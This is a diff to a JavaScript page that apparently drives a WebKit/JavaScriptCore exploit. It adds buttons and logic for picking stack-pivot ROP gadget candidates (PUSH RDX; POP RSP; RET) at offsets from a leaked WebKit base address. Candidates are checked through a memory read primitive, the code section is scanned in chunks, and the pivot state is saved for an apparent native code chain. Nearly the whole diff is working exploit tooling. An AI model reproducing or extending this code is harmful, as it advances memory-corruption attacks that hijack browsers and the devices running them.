@@ -15,10 +15,12 @@ import {
     saveScannedPivot,
     G5_PATTERNS,
     checkG5Bytes,
+    g5DerivedHint,
+    G5_DELTA_FROM_G0,
 } from "./pivot_gadgets.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250828m";
+const BUILD_ID = "rw-20250828n";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -32,7 +34,7 @@ const SCAN_NEAR_RADIUS = parseInt(params.get("scanrad") || "8000", 16);
 /** Bounded steps per auto-loop tick — yields + GC between chunks */
 const SCAN_CHUNK_STEPS = parseInt(params.get("scanchunk") || "2048", 10);
 /** G5 full low scan is opt-in (OOM risk) — default cluster-only */
-const SCAN_G5_FULL = params.get("g5full") === "1";
+let scanG5Full = params.get("g5full") === "1";
 /** cal-style fast scan: read8 + 8-byte step, yield every 256 reads (like scanGadgetChunk) */
 const SCAN_YIELD_EVERY = parseInt(params.get("scanyield") || "256", 10);
 const SCAN_G5_CAND_MAX = 24;
@@ -76,6 +78,7 @@ let outEl, stateEl, mapBody, hexEl, pickPtr, addrIn;
 let btnStart, btnSaveBases, btnRwProof, btnNative, btnPeek, btnClear;
 let btnVerifyPivot, btnScanPivot;
 let gadgetBtns = [];
+let g5BarBtns = [];
 let nativeChain = null;
 let nativeAllowed = false;
 let pivotReady = false;
@@ -226,6 +229,10 @@ function setUi() {
     if (addrIn) addrIn.disabled = busy || !ready;
     for (let i = 0; i < gadgetBtns.length; i++)
         gadgetBtns[i].disabled = busy || !ready;
+    for (let i = 0; i < g5BarBtns.length; i++)
+        g5BarBtns[i].disabled = busy || !ready;
+    const btnClearPivot = $("btn-clear-pivot");
+    if (btnClearPivot) btnClearPivot.disabled = busy;
 }
 
 function updatePivotReady(p, off) {
@@ -470,6 +477,113 @@ function saveBasesManual() {
     } finally {
         busy = false;
         setUi();
+    }
+}
+
+function applyG5Rva(rva) {
+    const found = loadScannedPivot() || Object.assign({}, PIVOT_HW_1352);
+    found.wk_PUSH_RDX_POP_RSP_RET = rva;
+    const { webkitBase } = basesFromSession(loadEffectiveOff());
+    if (webkitBase) saveScannedPivot(webkitBase, found);
+    else {
+        try { sessionStorage.setItem("wk-scanned-pivot", JSON.stringify(found)); } catch (_) { }
+    }
+    mark("G5-SET", "+0x" + rva.toString(16) + " saved — verifying…");
+    if (ready && window.p) {
+        const p = window.p;
+        const off = loadEffectiveOff();
+        updatePivotReady(p, off);
+        if (webkitBase) {
+            const g5 = checkG5Bytes((a) => read1p(p, a), webkitBase, rva);
+            mark(g5 ? "GADGET-OK" : "GADGET-BAD",
+                "G5 +0x" + rva.toString(16)
+                    + (g5 ? " " + g5.kind : " — bytes mismatch"));
+            updatePivotReady(p, off);
+        }
+    }
+    setUi();
+}
+
+function clearPivotState() {
+    try {
+        sessionStorage.removeItem("wk-pivot-scan-state");
+        sessionStorage.removeItem("wk-scanned-pivot");
+        sessionStorage.removeItem("wk-scanned-pivot-base");
+    } catch (_) { }
+    pivotScan = null;
+    pivotReady = false;
+    mark("PIVOT-CLEAR", "G5 + scan state cleared");
+    setUi();
+}
+
+function peekG5Rva(rva) {
+    if (!ready || !window.p) {
+        mark("G5-SKIP", "need Start + Save bases first");
+        return;
+    }
+    const { webkitBase } = basesFromSession(loadEffectiveOff());
+    if (!webkitBase) {
+        mark("G5-SKIP", "no webkitBase");
+        return;
+    }
+    const addr = webkitBase.add32(rva);
+    if (addrIn) addrIn.value = String(addr).replace(/^0x/i, "");
+    peekAt(addr);
+}
+
+function wireG5Bar() {
+    const host = $("gadget-g5");
+    if (!host) return;
+    const g0 = PIVOT_HW_1352.wk_MOV_RDI_RSI_30_CALL;
+    const predicted = g5DerivedHint(PIVOT_HW_1352);
+    const cands = predicted > 0
+        ? [predicted, predicted - 3, predicted + 4]
+        : [0x2411ac, 0x2411a9, 0x2411b0];
+    const seen = new Set();
+    const uniq = [];
+    for (let i = 0; i < cands.length; i++) {
+        if (seen.has(cands[i])) continue;
+        seen.add(cands[i]);
+        uniq.push(cands[i]);
+    }
+
+    function addBtn(label, fn) {
+        const b = document.createElement("button");
+        b.type = "button";
+        b.className = "secondary";
+        b.textContent = label;
+        b.disabled = true;
+        wireClick(b, fn);
+        host.appendChild(b);
+        g5BarBtns.push(b);
+    }
+
+    for (let i = 0; i < uniq.length; i++) {
+        const rva = uniq[i];
+        addBtn("G5 +0x" + rva.toString(16), function () { applyG5Rva(rva); });
+    }
+    addBtn("peek +0x" + uniq[0].toString(16), function () { peekG5Rva(uniq[0]); });
+    addBtn("G5 probe", function () { runG5ClusterProbe(); });
+    addBtn("G5 full scan", function () {
+        scanG5Full = true;
+        runG5ClusterProbe();
+    });
+
+    const clearHost = host;
+    const clearBtn = document.createElement("button");
+    clearBtn.type = "button";
+    clearBtn.className = "secondary";
+    clearBtn.id = "btn-clear-pivot";
+    clearBtn.textContent = "Clear pivot";
+    clearBtn.disabled = false;
+    wireClick(clearBtn, function () { clearPivotState(); });
+    clearHost.appendChild(clearBtn);
+
+    const hint = host.querySelector(".bar-label");
+    if (hint && g0 != null) {
+        hint.textContent = "G5 candidates (G0 +0x" + g0.toString(16)
+            + " + 0x" + G5_DELTA_FROM_G0.toString(16)
+            + ") — tap to set + verify";
     }
 }
 
@@ -880,7 +994,7 @@ async function scanPivotRowPhase(p, webkitBase, off) {
     const range = pivotScanRange(key, pivotScan.phase, pivotScan.found);
     if (!range) {
         if (label === "G5" && pivotScan.phase === "cluster") {
-            mark("G5-PHASE", "no cluster — use ?g5=RVA or ?g5full=1");
+            mark("G5-PHASE", "no cluster — use G5 bar or full scan");
             pivotScan.rowIdx++;
             pivotScan.cursor = null;
             pivotScan.phase = "cluster";
@@ -988,16 +1102,16 @@ async function scanPivotRowPhase(p, webkitBase, off) {
     }
 
     if (label === "G5" && pivotScan.phase === "cluster") {
-        if (SCAN_G5_FULL) {
+        if (scanG5Full) {
             pivotScan.phase = "low";
             pivotScan.cursor = null;
             pivotScan.bestHit = null;
             savePivotScanState(pivotScan);
-            mark("G5-PHASE", "cluster miss — ?g5full=1 low .text (chunked)");
+            mark("G5-PHASE", "cluster miss — G5 full scan (chunked)");
             return "continue";
         }
         logG5Cands(pivotScan.g5Cands);
-        mark("SCAN-MISS", "G5 — try ?g5=2411ac or ?g5full=1");
+        mark("SCAN-MISS", "G5 — tap G5 +0x2411ac or G5 full scan");
         pivotScan.rowIdx++;
         pivotScan.phase = "nearg5";
         pivotScan.bestHit = null;
@@ -1552,6 +1666,7 @@ function init() {
     }
 
     wireGadgetBars();
+    wireG5Bar();
     wireClick(btnStart, function () { return runStart(); });
     wireClick(btnSaveBases, saveBasesManual);
     wireClick(btnRwProof, function () { return runRwProofManual(); });
